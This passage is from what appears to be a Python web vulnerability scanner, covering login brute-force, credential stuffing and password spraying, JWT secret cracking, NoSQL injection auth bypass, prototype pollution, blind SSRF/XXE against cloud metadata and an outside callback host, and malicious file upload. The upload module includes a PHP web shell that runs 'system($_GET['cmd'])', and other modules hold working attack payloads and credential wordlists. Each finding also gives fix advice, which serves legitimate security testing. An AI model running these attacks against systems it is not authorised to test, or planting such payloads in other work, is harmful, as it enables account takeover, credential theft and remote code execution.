        for user, passwd in SQL_TRUNCATION + UNICODE_BYPASS:
            if found: break
            result = _try_login(user, passwd)
            if result == "LOCKOUT": break
            if result:
                _add_brute_success(user, passwd, login_url,
                                   "SQL Truncation/Unicode Bypass",
                                   f"Payload username='{user[:30]}' accepted")
                break
            time.sleep(0.4)

    # ── LEVEL 2a: Custom Wordlist ─────────────────────────────────
    if not found and wordlist and os.path.exists(wordlist):
        try:
            with open(wordlist) as wf:
                passwords = [l.strip() for l in wf if l.strip()]
            test_user = custom_user or "admin"
            info(f"[L2] Custom wordlist: {len(passwords)} passwords for user '{test_user}'...")
            for passwd in passwords:
                if found: break
                result = _try_login(test_user, passwd)
                if result == "LOCKOUT": break
                if result:
                    _add_brute_success(test_user, passwd, login_url,
                                       "Custom Wordlist",
                                       f"Wordlist password '{passwd}' succeeded")
                    break
                time.sleep(0.5)
        except Exception as e:
            warn(f"Wordlist read error: {e}")

    # ── LEVEL 2b: Credential Stuffing (combo file) ────────────────
    if not found and combo_file and os.path.exists(combo_file):
        try:
            pairs = []
            with open(combo_file) as cf:
                for line in cf:
                    line = line.strip()
                    if ":" in line:
                        u, p = line.split(":", 1)
                        pairs.append((u.strip(), p.strip()))
            info(f"[L2] Credential stuffing: {len(pairs)} user:pass pairs...")
            for user, passwd in pairs:
                if found: break
                result = _try_login(user, passwd)
                if result == "LOCKOUT": break
                if result:
                    _add_brute_success(user, passwd, login_url,
                                       "Credential Stuffing",
                                       f"Combo pair {user}:{passwd} from combo file succeeded")
                    break
                time.sleep(0.5)
        except Exception as e:
            warn(f"Combo file read error: {e}")

    # ── LEVEL 2c: Password Spray ──────────────────────────────────
    if not found and spray_pass:
        SPRAY_USERS = [
            "admin","administrator","root","user","guest","test","demo",
            "support","operator","manager","webmaster","info","service",
            "api","dev","staging","backup","monitor","readonly",
        ]
        if custom_user and custom_user not in SPRAY_USERS:
            SPRAY_USERS.insert(0, custom_user)
        info(f"[L2] Password spray: '{spray_pass}' → {len(SPRAY_USERS)} usernames...")
        for user in SPRAY_USERS:
            if found: break
            result = _try_login(user, spray_pass)
            if result == "LOCKOUT": break
            if result:
                _add_brute_success(user, spray_pass, login_url,
                                   "Password Spray",
                                   f"Spray password '{spray_pass}' succeeded for user '{user}'")
                break
            time.sleep(1.0)   # longer delay for spray to avoid lockout

    # ── LEVEL 3: Timing Attack — Username Enumeration ─────────────
    info("[L3] Timing attack — enumerating valid usernames...")
    TIMING_USERS = ["admin","administrator","root","user","test","guest",
                    "support","webmaster","info","api","dev","manager"]
    if custom_user and custom_user not in TIMING_USERS:
        TIMING_USERS.insert(0, custom_user)

    timing_results = {}
    for uname in TIMING_USERS:
        try:
            data = {user_field: uname, pass_field: "INVALIDPASSWORD_ZZZ_TIMING"}
            if csrf_info and csrf_info[0] and csrf_info[1]:
                data[csrf_info[0]] = csrf_info[1]
            hdrs = _rotated_headers()
            times = []
            for _ in range(2):
                t0 = time.time()
                rpost(login_url, data=data, timeout=10,
                      headers=hdrs, allow_redirects=False, verify=False)
                times.append(time.time() - t0)
                time.sleep(0.2)
            timing_results[uname] = sum(times) / len(times)
            vlog(f"  timing {uname}: {timing_results[uname]:.3f}s")
        except Exception:
            pass

    if timing_results:
        avg_all = sum(timing_results.values()) / len(timing_results)
        for uname, t in timing_results.items():
            if t > avg_all * 1.6 and t > avg_all + 0.1:
                add("login_brute", {
                    "confirmed": True,
                    "severity": "Medium",
                    "title": f"Valid Username Found via Timing Attack: '{uname}'",
                    "url": login_url,
                    "description": (
                        f"CONFIRMED: Username '{uname}' response time ({t:.3f}s) "
                        f"is {((t/avg_all-1)*100):.0f}% slower than average ({avg_all:.3f}s). "
                        "Server-side timing difference reveals valid usernames — "
                        "attackers enumerate valid accounts before targeted brute-force."),
                    "recommendation": (
                        "Return identical error messages and response times for "
                        "both valid and invalid usernames. Use constant-time "
                        "comparison for credentials."),
                })
                good(f"[L3] Timing: '{uname}' likely valid ({t:.3f}s vs avg {avg_all:.3f}s)")

    # ── LEVEL 3: 2FA-Aware Check ──────────────────────────────────
    info("[L3] 2FA/OTP screen detection after brute-force...")
    OTP_INDICATORS = ["otp","one-time","verification code","authenticator",
                      "2fa","two-factor","mfa","enter code","6-digit"]
    for user, passwd in DEFAULT_CREDS[:10]:
        try:
            data = {user_field: user, pass_field: passwd}
            if csrf_info and csrf_info[0] and csrf_info[1]:
                data[csrf_info[0]] = csrf_info[1]
            r = rpost(login_url, data=data, timeout=8,
                      headers=_rotated_headers(), allow_redirects=True,
                      verify=False)
            body_low = r.text.lower()
            if any(x in body_low for x in OTP_INDICATORS):
                add("login_brute", {
                    "confirmed": True,
                    "severity": "High",
                    "title": f"2FA Screen Triggered by {user}:{passwd}",
                    "url": login_url,
                    "description": (
                        f"CONFIRMED: Password '{passwd}' for user '{user}' "
                        "is CORRECT but 2FA/OTP screen appeared. "
                        "The password itself is weak/default and must be changed. "
                        "2FA is active — OTP bypass technique needed for full access."),
                    "recommendation": (
                        "Change this default password immediately. "
                        "Ensure 2FA is enforced for all accounts. "
                        "Consider OTP brute-force protection (rate limit + lockout)."),
                })
                good(f"[L3] 2FA-aware: '{user}:{passwd}' correct password, 2FA active")
                break
        except Exception:
            pass
        time.sleep(0.3)

    # ── LEVEL 4: JWT Secret Brute-Force ──────────────────────────
    info("[L4] JWT secret brute-force (HS256 weak secrets)...")
    JWT_SECRETS = [
        "secret","password","key","private","jwt","token","admin",
        "1234","123456","qwerty","letmein","changeme","mysecret",
        "supersecret","verysecret","yoursecret","oursecret",
        "jwtkey","jwttoken","jwtsecret","apikey","apitoken",
        "app_secret","app_key","flask_secret","django_secret",
        "rails_secret","laravel_secret","express_secret",
        "secretkey","secret_key","signing_key","auth_secret",
        "hs256","hs384","hs512","rs256","es256",
        "0000","1111","1234567890","abcdef","abc123",
        "null","undefined","none","test","dev","prod",
        "development","production","staging","local",
        "", "jwt_secret_key", "my_jwt_secret", "access_token_secret",
    ]

    # Look for JWT in cookies or response headers
    jwt_found = None
    try:
        r = rget(url, timeout=8)
        # Check Set-Cookie for JWT pattern
        all_cookies = r.headers.get("Set-Cookie","") + str(r.cookies.get_dict())
        jwt_m = re.search(
            r'(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+)',
            all_cookies + r.text[:5000])
        if jwt_m:
            jwt_found = jwt_m.group(1)
            info(f"[L4] JWT token found: {jwt_found[:60]}...")
    except Exception:
        pass

    if jwt_found:
        try:
            parts = jwt_found.split(".")
            if len(parts) == 3:
                header_b64, payload_b64, sig_b64 = parts
                for secret in JWT_SECRETS:
                    try:
                        sign_input = f"{header_b64}.{payload_b64}".encode()
                        expected = _b64.urlsafe_b64encode(
                            _hmac.new(secret.encode(), sign_input,
                                      hashlib.sha256).digest()
                        ).rstrip(b"=").decode()
                        if expected == sig_b64:
                            add("login_brute", {
                                "confirmed": True,
                                "severity": "Critical",
                                "title": f"JWT Secret Cracked: '{secret}'",
                                "url": url,
                                "description": (
                                    f"CONFIRMED: JWT HS256 secret is '{secret}'. "
                                    "An attacker can forge arbitrary JWT tokens, "
                                    "impersonate any user including admin, "
                                    "and bypass all authentication."),
                                "recommendation": (
                                    "Replace JWT secret with a cryptographically "
                                    "random 256-bit key. Never use weak or guessable "
                                    "secrets. Consider rotating all existing tokens."),
                            })
                            vuln(f"[L4] JWT secret CRACKED: '{secret}'", "Critical")
                            break
                    except Exception:
                        pass
        except Exception:
            pass

    # ── LEVEL 4: GraphQL Batch Brute-Force ───────────────────────
    info("[L4] GraphQL batch brute-force probe...")
    gql_endpoints = ["/graphql","/api/graphql","/v1/graphql","/gql"]
    BATCH_PASSWORDS = [
        "admin","password","123456","12345","qwerty","abc123",
        "letmein","changeme","secret","admin123","pass","1234",
        "password1","welcome","monkey","dragon","master","login",
        "admin@123","Admin@123","P@ssw0rd","admin1234","root123",
    ]
    for gep in gql_endpoints:
        try:
            gql_url = base + gep
            # Build batch mutation with 20 password attempts
            mutations = " ".join([
                f'a{i}: login(username:"admin",password:"{p}"){{token userId}}'
                for i, p in enumerate(BATCH_PASSWORDS[:20])
            ])
            payload = {"query": f"mutation{{{mutations}}}"}
            r = rpost(gql_url, json=payload, timeout=10,
                      headers=_rotated_headers(), verify=False)
            if r.status_code == 200:
                resp = r.text
                if "token" in resp.lower() or "userId" in resp.lower():
                    # Look for successful auth (non-null token)
                    tok_m = re.search(r'"token"\s*:\s*"([^"]{10,})"', resp)
                    if tok_m:
                        add("login_brute", {
                            "confirmed": True,
                            "severity": "Critical",
                            "title": "GraphQL Batch Login Brute-Force Succeeded",
                            "url": gql_url,
                            "description": (
                                f"CONFIRMED: GraphQL batch mutation accepted multiple "
                                f"login attempts in a single request and returned a token: "
                                f"'{tok_m.group(1)[:40]}...'. "
                                "Batch queries bypass rate limiting — attackers can try "
                                "hundreds of passwords per HTTP request."),
                            "recommendation": (
                                "Disable GraphQL batching or limit batch size to 1. "
                                "Implement per-query rate limiting and depth limiting. "
                                "Add query complexity analysis."),
                        })
                        vuln(f"[L4] GraphQL batch brute-force: token obtained!", "Critical")
                    elif "errors" not in resp.lower() and r.status_code == 200:
                        add("login_brute", {
                            "confirmed": False,
                            "severity": "High",
                            "title": "GraphQL Batch Login Accepted — Rate Limit Bypass Possible",
                            "url": gql_url,
                            "description": (
                                "GraphQL endpoint accepted batch login mutation with "
                                "20 passwords in a single request — no batch size limit. "
                                "Rate limiting may be bypassable via batching."),
                            "recommendation": (
                                "Limit GraphQL batch size. Implement per-operation "
                                "rate limiting regardless of batching."),
                        })
        except Exception:
            pass

    # ── LEVEL 4: API Key Pattern Brute-Force ─────────────────────
    info("[L4] API key brute-force probe...")
    API_PATHS = [
        "/api/v1/users","/api/v2/users","/api/users",
        "/api/v1/me","/api/profile","/api/admin",
    ]
    API_KEYS = [
        "admin","secret","1234","apikey","api_key","test",
        "demo","default","changeme","password","12345678",
        "abcdef123456","0000000000000000","ffffffffffffffff",
    ]
    for apath in API_PATHS[:3]:
        try:
            for key in API_KEYS[:8]:
                r = rget(base + apath, timeout=5,
                         headers={**_rotated_headers(),
                                  "Authorization": f"Bearer {key}",
                                  "X-API-Key": key,
                                  "X-Auth-Token": key},
                         verify=False)
                if r.status_code == 200 and len(r.content) > 50:
                    try:
                        data = r.json()
                        if isinstance(data, (dict, list)) and data:
                            add("login_brute", {
                                "confirmed": True,
                                "severity": "Critical",
                                "title": f"API Key Brute-Force — Weak Key: '{key}'",
                                "url": base + apath,
                                "description": (
                                    f"CONFIRMED: API endpoint {apath} accepted "
                                    f"weak API key '{key}' and returned data. "
                                    "Weak API keys allow unauthorized access to "
                                    "protected API resources."),
                                "recommendation": (
                                    "Use cryptographically random API keys "
                                    "(minimum 32 characters). Implement API key "
                                    "rotation and revocation. Add rate limiting."),
                            })
                            vuln(f"[L4] API key '{key}' works at {apath}", "Critical")
                            break
                    except Exception:
                        pass
                time.sleep(0.2)
        except Exception:
            pass

    if not found and lockout_count[0] == 0:
        good("[L1-L4] No login brute-force success detected")
    elif lockout_count[0] >= 2:
        add("login_brute", {
            "confirmed": True,
            "severity": "Medium",
            "title": "Account Lockout Mechanism Detected",
            "url": login_url,
            "description": (
                "CONFIRMED: Account lockout triggered after repeated failed attempts — "
                "brute-force protection is active. This is a POSITIVE security finding."),
            "recommendation": "Lockout is working correctly. Ensure lockout duration is at least 15 minutes.",
        })
        good("[L2] Account lockout mechanism is working correctly")

    _module_done("login_brute")



# ═══════════════════════════════════════════════════════════════════
#  MODULE 73 — NoSQL Injection
# ═══════════════════════════════════════════════════════════════════
def nosql_injection_scan(url):
    if _module_skip("nosql_inject"): info("Skipping NoSQL Injection (already done)"); return
    section("MODULE 73 — NoSQL INJECTION","💉")

    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    # Auth bypass payloads for MongoDB-style NoSQL
    NOSQL_PAYLOADS = [
        # Query operator injection
        {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        {"username": "admin", "password": {"$gt": ""}},
        {"username": "admin", "password": {"$ne": "wrong"}},
        {"username": {"$where": "1==1"}, "password": {"$where": "1==1"}},
    ]

    # URL-encoded GET param payloads
    NOSQL_GET_PAYLOADS = [
        "[$ne]=invalid",
        "[$gt]=",
        "[$regex]=.*",
        "[$exists]=true",
    ]

    # Login endpoints to test
    LOGIN_PATHS = [
        "/login", "/api/login", "/api/v1/login",
        "/auth/login", "/signin", "/api/auth",
        "/api/v1/auth", "/api/users/login",
    ]

    found = False

    # Test JSON POST (most common for Node.js + MongoDB)
    for path in LOGIN_PATHS:
        ep = base + path
        try:
            r = rget(ep, timeout=5)
            if r.status_code == 404: continue
        except Exception:
            continue

        for payload in NOSQL_PAYLOADS:
            try:
                r = requests.post(ep, json=payload, timeout=TIMEOUT,
                                  headers={"Content-Type": "application/json"},
                                  verify=False)
                body_low = r.text.lower()
                # Success indicators
                if any(x in body_low for x in
                       ["token", "dashboard", "welcome", "success",
                        "logged in", "access_token", "auth_token"]):
                    if not any(x in body_low for x in
                               ["invalid", "failed", "error", "wrong", "incorrect"]):
                        add("nosql_inject", {
                            "confirmed": True,
                            "severity": "Critical",
                            "title": f"NoSQL Injection — Auth Bypass at {path}",
                            "url": ep,
                            "description": (
                                f"CONFIRMED: MongoDB operator injection bypassed authentication. "
                                f"Payload: {payload} → Response contains success indicators. "
                                f"An attacker can login as any user without knowing their password."),
                            "recommendation": (
                                "Sanitize all user input before passing to MongoDB queries. "
                                "Use type checking to reject objects where strings are expected. "
                                "Consider using an ODM like Mongoose with strict schema validation.\n"
                                "Fix example:\n"
                                "  // Reject if input is object (not string)\n"
                                "  if (typeof req.body.username !== 'string') return res.status(400).json({error:'Invalid input'});\n"
                                "  if (typeof req.body.password !== 'string') return res.status(400).json({error:'Invalid input'});"),
                        })
                        vuln(f"NoSQL Injection AUTH BYPASS at {path}", "Critical")
                        found = True
                        break
            except Exception:
                pass
        if found: break

    # Test GET params with NoSQL operators
    try:
        r0 = rget(url, timeout=5)
        # Find URL params
        params_m = re.findall(r'[?&]([^=&]+)=([^&]*)', url)
        if not params_m:
            # Try common param names
            params_m = [("id", "1"), ("user", "admin"), ("q", "test")]

        for pname, pval in params_m[:3]:
            for suffix in NOSQL_GET_PAYLOADS:
                test_url = re.sub(
                    rf'([?&]{re.escape(pname)}=)[^&]*',
                    rf'\g<1>{requests.utils.quote(suffix)}',
                    url
                )
                try:
                    r = rget(test_url, timeout=TIMEOUT)
                    if r.status_code == 200 and len(r.content) > 100:
                        # Different response than baseline
                        if abs(len(r.content) - len(r0.content)) > 200:
                            add("nosql_inject", {
                                "confirmed": False,
                                "severity": "High",
                                "title": f"Potential NoSQL Injection — GET param '{pname}'",
                                "url": test_url,
                                "description": (
                                    f"NoSQL operator suffix '{suffix}' on param '{pname}' "
                                    f"produced a different response (size diff: "
                                    f"{abs(len(r.content)-len(r0.content))}B). "
                                    "Manual verification recommended."),
                                "recommendation": (
                                    "Validate and sanitize all GET parameters. "
                                    "Reject MongoDB operator prefixes ($ne, $gt, $regex) in user input."),
                            })
                except Exception:
                    pass
    except Exception:
        pass

    if not found:
        good("No NoSQL injection detected")
    _module_done("nosql_inject")


# ═══════════════════════════════════════════════════════════════════
#  MODULE 74 — Server-Side Prototype Pollution (SSPP)
# ═══════════════════════════════════════════════════════════════════
def sspp_scan(url):
    if _module_skip("sspp"): info("Skipping SSPP (already done)"); return
    section("MODULE 74 — SERVER-SIDE PROTOTYPE POLLUTION","🔗")

    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    # SSPP payloads targeting Node.js __proto__ / constructor
    SSPP_PAYLOADS = [
        {"__proto__": {"polluted": "webscanpro_sspp_test"}},
        {"constructor": {"prototype": {"polluted": "webscanpro_sspp_test"}}},
        {"__proto__[polluted]": "webscanpro_sspp_test"},
        {"constructor.prototype.polluted": "webscanpro_sspp_test"},
    ]

    # Endpoints likely to merge/assign user JSON
    API_PATHS = [
        "/api/settings", "/api/profile", "/api/update",
        "/api/v1/settings", "/api/v1/profile",
        "/api/user/settings", "/api/user/update",
        "/settings", "/profile/update", "/account/settings",
    ]

    # Canary endpoints to check if pollution propagated
    CANARY_PATHS = ["/api/status", "/api/health", "/api/", "/api/v1/", url]

    found = False

    for path in API_PATHS:
        ep = base + path
        try:
            r0 = rget(ep, timeout=5)
            if r0.status_code == 404: continue
        except Exception:
            continue

        for payload in SSPP_PAYLOADS:
            try:
                # Send pollution payload
                rpost(ep, json=payload, timeout=TIMEOUT,
                      headers={"Content-Type": "application/json"}, verify=False)

                # Check if any endpoint reflects polluted property
                for canary in CANARY_PATHS:
                    try:
                        rc = rget(canary, timeout=5)
                        if "webscanpro_sspp_test" in rc.text:
                            add("sspp", {
                                "confirmed": True,
                                "severity": "Critical",
                                "title": f"Server-Side Prototype Pollution at {path}",
                                "url": ep,
                                "description": (
                                    f"CONFIRMED: Prototype pollution payload {list(payload.keys())[0]} "
                                    f"propagated to server-side JavaScript prototype. "
                                    f"Canary value 'webscanpro_sspp_test' found at {canary}. "
                                    "This can lead to privilege escalation, DoS, or RCE."),
                                "recommendation": (
                                    "Use Object.freeze(Object.prototype) in Node.js to prevent pollution.\n"
                                    "Fix example:\n"
                                    "  // At app startup:\n"
                                    "  Object.freeze(Object.prototype);\n"
                                    "  Object.freeze(Object);\n"
                                    "Or use libraries like 'secure-json-parse' for safe JSON parsing.\n"
                                    "Also validate and reject keys like __proto__, constructor, prototype."),
                            })
                            vuln(f"SSPP CONFIRMED at {path}", "Critical")
                            found = True
                            break
                    except Exception:
                        pass
                if found: break
            except Exception:
                pass
        if found: break

    # Heuristic: check if endpoint accepts __proto__ without error
    if not found:
        for path in API_PATHS[:5]:
            ep = base + path
            try:
                r = rpost(ep, json={"__proto__": {"test": 1}}, timeout=5,
                          headers={"Content-Type": "application/json"}, verify=False)
                if r.status_code in (200, 201, 204):
                    # No error means __proto__ key was accepted silently
                    add("sspp", {
                        "confirmed": False,
                        "severity": "High",
                        "title": f"Potential SSPP — __proto__ accepted at {path}",
                        "url": ep,
                        "description": (
                            f"Endpoint {path} accepted a JSON body with __proto__ key "
                            f"without returning an error (status {r.status_code}). "
                            "If server merges this input, prototype pollution may occur. "
                            "Manual verification with interactsh recommended."),
                        "recommendation": (
                            "Reject or sanitize JSON keys containing __proto__, "
                            "constructor, or prototype before merging user input."),
                    })
            except Exception:
                pass

    if not found:
        good("No server-side prototype pollution detected")
    _module_done("sspp")


# ═══════════════════════════════════════════════════════════════════
#  MODULE 75 — OOB (Out-of-Band) Blind SSRF/XXE
# ═══════════════════════════════════════════════════════════════════
def oob_blind_scan(url):
    if _module_skip("oob_blind"): info("Skipping OOB Blind (already done)"); return
    section("MODULE 75 — OOB BLIND SSRF/XXE","📡")

    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"
    domain = parsed.netloc.split(":")[0]

    # OOB canary domain (interactsh public instance)
    OOB_DOMAIN = f"oob.{domain}.scan.webscanpro.local"
    INTERACTSH  = "oob.interactsh.com"  # public instance

    # Blind SSRF payloads targeting internal/cloud metadata
    BLIND_SSRF_TARGETS = [
        f"http://{INTERACTSH}/ssrf-test",
        "http://169.254.169.254/latest/meta-data/",          # AWS
        "http://metadata.google.internal/computeMetadata/v1/",# GCP
        "http://169.254.169.254/metadata/instance",           # Azure
        "http://100.100.100.200/latest/meta-data/",           # Alibaba
        f"http://{OOB_DOMAIN}/ssrf",
    ]

    # Endpoints likely to fetch URLs
    URL_PARAMS = ["url", "uri", "link", "src", "source", "redirect",
                  "callback", "webhook", "endpoint", "target", "fetch",
                  "image", "img", "file", "path", "proxy", "forward"]

    found_potential = False

    # Find URL-like parameters
    try:
        r0 = rget(url, timeout=8)
        # Check all params in the URL
        params = dict(re.findall(r'[?&]([^=&]+)=([^&]*)', url))
        if not params:
            params = {p: "http://test.com" for p in URL_PARAMS[:3]}

        for param, val in params.items():
            if param.lower() not in URL_PARAMS:
                continue
            for ssrf_target in BLIND_SSRF_TARGETS[:3]:
                test_url = re.sub(
                    rf'([?&]{re.escape(param)}=)[^&]*',
                    rf'\g<1>{requests.utils.quote(ssrf_target)}',
                    url
                )
                if param not in url:
                    test_url = url + ("&" if "?" in url else "?") + f"{param}={requests.utils.quote(ssrf_target)}"
                try:
                    t0 = time.time()
                    r = rget(test_url, timeout=10)
                    elapsed = time.time() - t0
                    # Timing-based blind SSRF detection
                    if elapsed > 5 and "169.254" in ssrf_target:
                        add("oob_blind", {
                            "confirmed": True,
                            "severity": "High",
                            "title": f"Blind SSRF — Timing Evidence on param '{param}'",
                            "url": test_url,
                            "description": (
                                f"CONFIRMED (timing): Request to cloud metadata IP "
                                f"169.254.169.254 via param '{param}' took {elapsed:.1f}s — "
                                "server appears to be making the outbound request (timeout = reachable). "
                                "An attacker can steal AWS/GCP/Azure credentials from the metadata API."),
                            "recommendation": (
                                "Block outbound requests to 169.254.169.254, 169.254.0.0/16, "
                                "and other internal/cloud ranges at the firewall level.\n"
                                "Whitelist allowed URLs if fetch functionality is required.\n"
                                "Verify with: curl -v 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'"),
                        })
                        found_potential = True
                    elif r.status_code == 200 and "metadata" in r.text.lower():
                        add("oob_blind", {
                            "confirmed": True,
                            "severity": "Critical",
                            "title": f"Blind SSRF — Cloud Metadata Access via '{param}'",
                            "url": test_url,
                            "description": (
                                f"CONFIRMED: Param '{param}' caused the server to fetch cloud "
                                f"metadata and return it in the response. "
                                "An attacker can steal IAM credentials and access all cloud resources."),
                            "recommendation": (
                                "Disable access to cloud metadata endpoints.\n"
                                "Use IMDSv2 (AWS) which requires session tokens.\n"
                                "Implement URL allowlist validation before any server-side fetch."),
                        })
                        found_potential = True
                except Exception:
                    pass
    except Exception:
        pass

    # Blind XXE with OOB DNS callback simulation
    XML_PATHS = ["/api/xml", "/upload", "/import", "/feed", "/rss",
                 "/api/v1/import", "/api/process", "/webhook"]
    XXE_OOB_PAYLOAD = f"""<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://{OOB_DOMAIN}/xxe">
  %remote;
]>
<root>&exfil;</root>"""

    for path in XML_PATHS:
        ep = base + path
        try:
            r = rget(ep, timeout=5)
            if r.status_code == 404: continue
            r2 = requests.post(ep,
                data=XXE_OOB_PAYLOAD,
                headers={"Content-Type": "application/xml"},
                timeout=10, verify=False)
            if r2.status_code not in (404, 405, 415):
                add("oob_blind", {
                    "confirmed": False,
                    "severity": "High",
                    "title": f"Potential OOB Blind XXE at {path}",
                    "url": ep,
                    "description": (
                        f"XML endpoint {path} accepted OOB XXE payload "
                        f"(status {r2.status_code}) — DNS callback to "
                        f"{OOB_DOMAIN} may have fired. "
                        "Confirm with: interactsh-client or Burp Collaborator."),
                    "recommendation": (
                        "Disable external entity processing in your XML parser.\n"
                        "Fix examples:\n"
                        "  Java: factory.setFeature('http://apache.org/xml/features/disallow-doctype-decl', true);\n"
                        "  PHP:  libxml_disable_entity_loader(true);\n"
                        "  Python lxml: etree.XMLParser(resolve_entities=False)\n"
                        "Verification: interactsh-client -v | grep xxe"),
                })
        except Exception:
            pass

    if not found_potential:
        good("No OOB blind SSRF/XXE indicators detected")
    _module_done("oob_blind")


# ═══════════════════════════════════════════════════════════════════
#  MODULE 76 — Malicious File Upload
# ═══════════════════════════════════════════════════════════════════
def file_upload_scan(url):
    if _module_skip("file_upload"): info("Skipping File Upload (already done)"); return
    section("MODULE 76 — MALICIOUS FILE UPLOAD","📁")

    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    # Upload endpoints to probe
    UPLOAD_PATHS = [
        "/upload", "/api/upload", "/api/v1/upload",
        "/file/upload", "/files/upload", "/media/upload",
        "/image/upload", "/avatar/upload", "/profile/photo",
        "/import", "/api/import", "/documents/upload",
        "/attachments", "/api/files", "/upload.php",
    ]

    # Dangerous file extensions to test
    DANGEROUS_EXTS = [
        ("shell.php",   "<?php echo 'WEBSCANPRO_PHP_RCE'; system($_GET['cmd']); ?>",
         "application/x-php", "PHP web shell"),
        ("shell.php5",  "<?php echo 'WEBSCANPRO_PHP_RCE'; ?>",
         "application/x-php", "PHP5 web shell"),
        ("shell.phtml", "<?php echo 'WEBSCANPRO_PHP_RCE'; ?>",
         "application/x-php", "PHTML PHP shell"),
        ("shell.jsp",   "<% out.println('WEBSCANPRO_JSP_RCE'); %>",
         "application/x-jsp", "JSP web shell"),
        ("shell.aspx",  "<% Response.Write('WEBSCANPRO_ASPX_RCE'); %>",
         "application/x-aspx", "ASPX web shell"),
        ("shell.svg",   "<svg onload=\"fetch('http://oob.webscanpro.local/xss')\">",
         "image/svg+xml", "SVG XSS"),
        ("shell.html",  '<script>document.write("WEBSCANPRO_HTML_XSS")</script>',
         "text/html", "HTML XSS via upload"),
        ("../../etc/passwd.txt", "test",
         "text/plain", "Path traversal in filename"),
    ]

    # Content-Type bypass: send PHP with image MIME
    BYPASS_TESTS = [
        ("shell.php", "<?php echo 'WEBSCANPRO_BYPASS'; ?>",
         "image/jpeg", "PHP disguised as JPEG"),
        ("shell.jpg.php", "<?php echo 'WEBSCANPRO_BYPASS'; ?>",
         "image/jpeg", "Double extension bypass"),
        ("shell.php.jpg", "<?php echo 'WEBSCANPRO_BYPASS'; ?>",
         "image/jpeg", "Null byte bypass"),
    ]

    found = False

    for path in UPLOAD_PATHS:
        ep = base + path
        try:
            r0 = rget(ep, timeout=5)
            if r0.status_code == 404: continue
        except Exception:
            continue

        good(f"Upload endpoint found: {ep}")

        # Test dangerous file types
        for fname, content, mime, label in DANGEROUS_EXTS + BYPASS_TESTS:
            try:
                files = {"file": (fname, content.encode(), mime)}
                # Also try common field names
                for field in ["file", "upload", "image", "avatar", "document"]:
                    files_test = {field: (fname, content.encode(), mime)}
                    r = requests.post(ep, files=files_test,
                                      timeout=TIMEOUT, verify=False)
                    body = r.text
                    # Check if upload "succeeded"
                    if r.status_code in (200, 201, 302):
                        if any(x in body.lower() for x in
                               ["success", "uploaded", "url", "path",
                                fname.split(".")[0], "file_url", "location"]):
                            # Try to find and access the uploaded file
                            _safe_fname = re.escape(fname.replace("../../etc/passwd.txt",""))
                            _pat = (r'(?:url|path|href|src|location)["\']?\s*[=:]\s*["\']?([^"\'<>\s,}]+' +
                                    _safe_fname + r'[^"\'<>\s,}]*)')
                            url_m = re.search(_pat, body, re.I)
                            shell_url = url_m.group(1) if url_m else None
                            if shell_url and not shell_url.startswith("http"):
                                shell_url = base + ("" if shell_url.startswith("/") else "/") + shell_url

                            confirmed = False
                            if shell_url:
                                try:
                                    rc = rget(shell_url, timeout=5)
                                    if any(x in rc.text for x in
                                           ["WEBSCANPRO_PHP_RCE", "WEBSCANPRO_JSP_RCE",
                                            "WEBSCANPRO_ASPX_RCE", "WEBSCANPRO_HTML_XSS",
                                            "WEBSCANPRO_BYPASS"]):
                                        confirmed = True
                                except Exception:
                                    pass

                            add("file_upload", {
                                "confirmed": confirmed,
                                "severity": "Critical",
                                "title": f"{'CONFIRMED' if confirmed else 'Potential'}: {label} Upload at {path} (field='{field}')",
                                "url": shell_url or ep,
                                "description": (
                                    f"{'CONFIRMED RCE: Web shell executed!' if confirmed else 'Potential:'} "
                                    f"File '{fname}' ({label}) accepted by upload endpoint {path}. "
                                    f"Upload field: '{field}'. Response status: {r.status_code}. "
                                    + (f"Shell accessible at: {shell_url}" if shell_url else "")),
                                "recommendation": (
                                    "1. Whitelist allowed file extensions (jpg, png, pdf only).\n"
                                    "2. Validate file content by magic bytes, not just extension or MIME type.\n"
                                    "3. Store uploads outside web root or in object storage (S3).\n"
                                    "4. Rename files on upload — never use original filename.\n"
                                    "5. Set Content-Disposition: attachment on file serving.\n"
                                    "6. Scan uploads with antivirus (ClamAV).\n"
                                    f"Verify: curl -F '{field}=@shell.php;type=image/jpeg' {ep}"),
                            })
                            if confirmed:
                                vuln(f"FILE UPLOAD RCE CONFIRMED: {label} at {path}", "Critical")
                            else:
                                warn(f"Potential dangerous upload: {label} at {path} (field='{field}')")
                            found = True
                            break
                if found: break
            except Exception:
                pass
        if found: break

    if not found:
        good("No dangerous file upload accepted")
    _module_done("file_upload")


# ═══════════════════════════════════════════════════════════════════
#  MODULE 77 — PostMessage & Browser Storage
# ═══════════════════════════════════════════════════════════════════
def postmessage_scan(url):
    if _module_skip("postmessage"): info("Skipping PostMessage/Storage (already done)"); return
    section("MODULE 77 — PostMessage & BROWSER STORAGE","💬")

    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    try:
        r = rget(url, timeout=8)
        html = r.text
        js_sources = []

        # Find JS files
        js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.I)
        for js_url in js_urls[:8]:
            if not js_url.startswith("http"):
                js_url = base + ("" if js_url.startswith("/") else "/") + js_url
            try:
                rj = rget(js_url, timeout=5)
                js_sources.append((js_url, rj.text))
            except Exception:
                pass
        js_sources.append((url, html))

        for js_url, js_code in js_sources:
            # 1. PostMessage without origin check
            if "postMessage" in js_code:
                has_origin_check = bool(re.search(
                    r"""addEventListener\s*\(\s*["']message["'].*?\.origin""", js_code, re.S))
                has_wildcard = "*" in js_code and "postMessage" in js_code

                if has_wildcard and not has_origin_check:
                    add("postmessage", {
                        "confirmed": True,
                        "severity": "High",
                        "title": "Insecure postMessage — Wildcard Origin (*) Without Validation",
                        "url": js_url,
                        "description": (
                            "CONFIRMED: JavaScript uses postMessage with wildcard origin '*' "
                            "and no event.origin validation in message listener. "
                            "Any malicious website can send arbitrary messages to this page, "
